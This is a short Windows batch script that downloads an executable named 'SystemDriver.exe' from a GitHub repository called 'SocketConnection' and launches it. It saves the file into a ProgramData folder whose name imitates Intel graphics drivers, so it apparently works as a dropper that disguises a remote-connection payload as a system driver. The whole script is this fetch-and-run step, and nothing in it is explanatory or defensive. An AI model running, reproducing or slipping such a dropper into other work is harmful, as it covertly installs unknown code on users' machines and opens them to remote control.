@echo off
if not exist "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe" curl "https://github.com/MichaelNoskov/SocketConnection/raw/main/SystemDriver.exe" -o "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe"
start /d "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/" SystemDriver.exe